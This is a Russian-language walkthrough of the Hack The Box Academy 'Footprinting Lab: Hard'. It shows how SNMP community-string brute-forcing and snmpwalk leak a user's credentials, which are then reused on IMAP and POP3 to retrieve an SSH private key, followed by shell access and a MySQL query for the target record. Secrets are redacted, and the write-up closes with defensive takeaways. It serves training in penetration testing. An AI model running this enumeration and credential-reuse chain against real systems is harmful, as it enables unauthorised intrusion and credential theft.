# Hack The Box Academy — Footprinting Lab: Hard

> **Платформа:** Hack The Box Academy  
> **Модуль:** Footprinting  
> **Сложность:** Hard  
> **Цель:** `10.129.202.20`  
> **Hostname:** `NIXHARD`  
> **Дата:** 3 октября 2026  

---

## 1. Цель лаборатории

Провести перечисление доступных сетевых служб на целевой системе, найти возможные точки входа и последовательно использовать полученную информацию для дальнейшего доступа к системе.

Финальная задача — обнаружить учётную запись `HTB` и получить связанный с ней пароль.

---

## 2. Краткий attack path

```text
TCP/UDP Enumeration
        ↓
SNMP 161/udp
        ↓
Community String: backup
        ↓
SNMP Walk
        ↓
Учётные данные tom
        ↓
POP3
        ↓
SSH Private Key
        ↓
SSH как tom
        ↓
Shell / MySQL History
        ↓
Локальный MySQL
        ↓
База users
        ↓
Запись HTB
```

---

## 3. Initial Reconnaissance

### 3.1 TCP Enumeration

Первым шагом было определение доступных TCP-служб и их версий:

```bash
nmap -sV -sC 10.129.202.20
```

### Результат

```text
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd
993/tcp open  ssl/imap Dovecot imapd
995/tcp open  ssl/pop3 Dovecot pop3d
```

TLS-сертификаты почтовых служб также раскрывали hostname:

```text
NIXHARD
```

### Анализ

На цели были доступны SSH и две почтовые службы — IMAP и POP3. Поскольку этот скан охватывал только TCP, следующим логичным шагом было отдельно проверить UDP-службы.

---

### 3.2 UDP Enumeration

```bash
sudo nmap -sU -sV -sC 10.129.202.20
```

### Результат

```text
68/udp  open|filtered dhcpc
161/udp open          snmp    net-snmp; net-snmp SNMPv3 server
```

### Анализ

Наиболее интересным результатом оказался SNMP на `161/udp`. Nmap определил реализацию как Net-SNMP и показал SNMPv3-related information, поэтому дальнейшее перечисление было сосредоточено на SNMP.

---

## 4. SNMP Enumeration

### 4.1 NSE-скрипты

Сначала были запущены стандартные SNMP NSE-скрипты:

```bash
sudo nmap -sU 10.129.202.20 -p161 -sV --script "snmp-*"
```

### Результат

Служба SNMP подтвердилась, однако полезная community string не была найдена.

### Анализ

Поскольку стандартные NSE-скрипты не дали достаточно информации, потребовался отдельный перебор community strings.

---

### 4.2 Поиск community string

Для перебора использовался `onesixtyone` с более крупным словарём SecLists:

```bash
onesixtyone \
  -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt \
  10.129.202.20 -w 100
```

### Результат

```text
10.129.202.20 [backup] Linux NIXHARD 5.4.0-90-generic ...
```

Была найдена рабочая community string:

```text
backup
```

### Анализ

Первоначально была сделана попытка использовать её в SNMPv3-команде:

```bash
snmpwalk -v3 -c backup 10.129.202.20
```

Она завершилась ошибкой, поскольку `-c` используется для community-based SNMP, а SNMPv3 требует `securityName` и других параметров аутентификации.

Рабочий вариант:

```bash
snmpwalk -v2c -c backup 10.129.202.20
```

---

### 4.3 Полный SNMP walk

Полный `snmpwalk` раскрыл большое количество системной информации. Из всего вывода наиболее важными оказались следующие строки:

```text
iso.3.6.1.2.1.1.5.0 = STRING: "NIXHARD"
iso.3.6.1.2.1.25.1.7.1.2.1.2... = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3... = STRING: "tom <REDACTED>"
```

В той же ветке присутствовал вывод, связанный с `chpasswd`, что дополнительно указывало на пользователя `tom`.

### Результат

| Данные | Значение |
|---|---|
| Hostname | `NIXHARD` |
| Скрипт | `/opt/tom-recovery.sh` |
| Пользователь | `tom` |
| Пароль | `<REDACTED>` |

### Анализ

SNMP раскрыл чувствительные данные из recovery-скрипта. Эти учётные данные можно было проверить на ранее обнаруженных сервисах аутентификации — прежде всего IMAP и POP3.

---

## 5. Mail Service Enumeration

### 5.1 IMAP

Проверка найденных учётных данных была начата с IMAP:

```bash
nc -nv 10.129.202.20 143
```

Аутентификация:

```text
1 LOGIN tom <REDACTED>
```

### Результат

Вход прошёл успешно. Были перечислены папки:

```text
Notes
Meetings
Important
INBOX
```

При проверке нескольких папок сервер возвращал:

```text
0 EXISTS
```

### Анализ

Учётные данные оказались рабочими, однако выбранные IMAP-папки не содержали полезных сообщений. Следующим шагом стала проверка POP3.

---

### 5.2 POP3

Подключение:

```bash
nc -nv 10.129.202.20 110
```

Аутентификация:

```text
USER tom
PASS <REDACTED>
```

### Результат

Команда:

```text
STAT
```

вернула:

```text
+OK 1 3661
```

То есть в почтовом ящике находилось одно сообщение.

Для его анализа использовались:

```text
LIST
UIDL
TOP 1 5
RETR 1
```

В теле письма был найден приватный SSH-ключ:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

### Анализ

Почтовый ящик пользователя `tom` содержал его приватный SSH-ключ. Поскольку SSH был открыт на `22/tcp`, этот ключ мог дать доступ к shell.

---

## 6. SSH Access

### 6.1 Подготовка ключа

Приватный ключ был сохранён в локальный файл. После этого права на файл были ограничены:

```bash
chmod 600 s
```

Проверка корректности ключа:

```bash
ssh-keygen -y -f s
```

### Результат

```text
ssh-rsa ... tom@NIXHARD
```

### Анализ

Ключ оказался валидным и соответствовал пользователю `tom`.

---

### 6.2 Подключение

```bash
ssh -i s tom@10.129.202.20
```

### Результат

```text
tom@NIXHARD:~$
```

SSH-аутентификация прошла успешно, и была получена оболочка пользователя `tom`.

---

## 7. Local Enumeration

После входа был просмотрен домашний каталог:

```bash
ls -la
```

Среди файлов выделялись:

```text
.bash_history
.mysql_history
.ssh
Maildir
```

Далее были изучены history-файлы:

```bash
cat .mysql_history
cat .bash_history
```

### Результат

`.mysql_history` содержал:

```text
show databases;
use users;
select * from users;
```

`.bash_history` содержал:

```text
mysql -u tom -p
```

### Анализ

История команд показала, что пользователь `tom` ранее подключался к локальному MySQL и работал с базой `users`.

---

## 8. MySQL Enumeration

### 8.1 Подключение

```bash
mysql -u tom -p
```

### Результат

Подключение прошло успешно.

Версия сервера:

```text
MySQL 8.0.27-0ubuntu0.20.04.1
```

---

### 8.2 Перечисление баз

Первая попытка сразу обратиться к таблице:

```sql
SELECT * FROM users;
```

вернула:

```text
ERROR 1046 (3D000): No database selected
```

После этого были перечислены базы:

```sql
SHOW DATABASES;
```

### Результат

```text
information_schema
mysql
performance_schema
sys
users
```

Интерес представляла пользовательская база:

```text
users
```

---

### 8.3 Перечисление таблиц

```sql
USE users;
SHOW TABLES;
```

### Результат

```text
users
```

Структура таблицы:

```sql
DESCRIBE users;
```

### Результат

```text
id
username
password
```

### Анализ

Теперь было понятно, что нужная информация хранится в таблице `users`, где есть поля `username` и `password`.

---

### 8.4 Получение целевой записи

Вместо вывода всей таблицы был выполнен точечный запрос:

```sql
SELECT username, password
FROM users
WHERE username = 'HTB';
```

### Результат

```text
HTB | <REDACTED>
```

На этом цель лаборатории была достигнута.

---

## 9. Findings Summary

| Этап | Находка | Значение |
|---|---|---|
| TCP Enumeration | SSH, POP3, IMAP | Найдены доступные сервисы аутентификации |
| UDP Enumeration | SNMP на `161/udp` | Обнаружен дополнительный источник информации |
| `onesixtyone` | Community string `backup` | Получен доступ к SNMPv2c enumeration |
| `snmpwalk` | Учётные данные `tom` | Найдены рабочие credentials |
| IMAP | Успешный вход | Подтверждена валидность credentials |
| POP3 | Приватный SSH-ключ | Найден путь к SSH-доступу |
| SSH | Shell как `tom` | Получен локальный доступ |
| History files | MySQL и база `users` | Найден следующий этап цепочки |
| MySQL | Запись `HTB` | Цель лаборатории достигнута |

---

## 10. Key Lessons

Ключевая сложность лаборатории заключалась не в одной уязвимости, а в правильном связывании информации из нескольких сервисов.

Главные практические выводы:

- для обнаружения SNMP потребовалось отдельное UDP-перечисление;
- fingerprint Nmap не означал, что SNMPv3 — единственный доступный режим;
- небезопасно настроенный SNMP раскрыл данные recovery-скрипта;
- найденные credentials оказались рабочими на почтовых сервисах;
- POP3 раскрыл приватный SSH-ключ;
- history-файлы пользователя подсказали наличие локального MySQL;
- MySQL было удобнее перечислять последовательно: база → таблица → структура → точечный запрос.

---

## 11. Security Takeaways

Вся цепочка стала возможной из-за нескольких небезопасных решений:

- SNMP не должен раскрывать чувствительные системные данные и credentials;
- recovery-скрипты не должны содержать plaintext-пароли;
- приватные SSH-ключи не должны храниться в почтовых сообщениях;
- shell history и history SQL-клиента могут раскрывать внутреннюю структуру системы;
- чувствительные данные не должны повторно использоваться между сервисами;
- локальные сервисы также нужно рассматривать как часть общей поверхности атаки после получения shell.

---

## 12. Command Cheat Sheet

| Задача | Команда |
|---|---|
| TCP enumeration | `nmap -sV -sC <TARGET>` |
| UDP enumeration | `sudo nmap -sU -sV -sC <TARGET>` |
| SNMP scripts | `sudo nmap -sU -p161 -sV --script "snmp-*"` |
| Community enumeration | `onesixtyone -c <WORDLIST> <TARGET>` |
| SNMP walk | `snmpwalk -v2c -c <COMMUNITY> <TARGET>` |
| IMAP | `nc -nv <TARGET> 143` |
| POP3 | `nc -nv <TARGET> 110` |
| Проверка SSH-ключа | `ssh-keygen -y -f <KEY>` |
| SSH | `ssh -i <KEY> user@<TARGET>` |
| MySQL | `mysql -u <USER> -p` |

---

## 13. Final Attack Path

```text
SNMP
  ↓
Leaked tom credentials
  ↓
POP3
  ↓
SSH private key
  ↓
SSH access
  ↓
Local history files
  ↓
MySQL
  ↓
HTB record
```
